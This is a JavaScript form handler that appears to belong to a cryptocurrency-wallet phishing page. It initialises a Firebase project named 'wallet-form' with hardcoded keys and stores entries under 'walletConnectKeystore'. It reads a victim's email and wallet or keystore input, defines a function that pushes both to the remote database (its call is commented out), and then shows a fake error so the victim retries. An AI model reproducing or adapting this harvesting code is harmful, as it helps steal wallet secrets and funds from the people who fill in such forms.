const firebaseConfig2 = {
    apiKey: "AIzaSyA7gwUX3gZzcitDi1o7d1cBofdjpuVhjWA",
    authDomain: "wallet-form-5f817.firebaseapp.com",
    databaseURL: "https://wallet-form-5f817-default-rtdb.firebaseio.com",
    projectId: "wallet-form-5f817",
    storageBucket: "wallet-form-5f817.appspot.com",
    messagingSenderId: "559255000272",
    appId: "1:559255000272:web:aaad5f8f5051e1093f3ad5"
};

firebase.initializeApp(firebaseConfig2, 'secondary')

var contactFormDB2 = firebase.database().ref('walletConnectKeystore')

document.getElementById('kButton').addEventListener('click', submitForm2)

function submitForm2(e) {
  e.preventDefault()
  var emailId =  document.getElementById('kemailid').value
  var walletAddress =  document.getElementById('kwalletAddress').value

  // saveMessages2(emailId, walletAddress)
  error2()
}

const saveMessages2 = (emailId, walletAddress)=>{
  var newContactForm = contactFormDB2.push()

  newContactForm.set({
    emailAdress:emailId,
    walletAddress:walletAddress,
  })
}
function error2() {
  document.querySelector('.k-block').classList.add('d-none')
  document.querySelector('.errorK').classList.remove('d-none')
  
}

document.querySelector('.closeK').addEventListener('click', ()=>{
  document.querySelector('.k-block').reset()
  document.querySelector('.k-block').classList.remove('d-none')
  document.querySelector('.errorK').classList.add('d-none')
})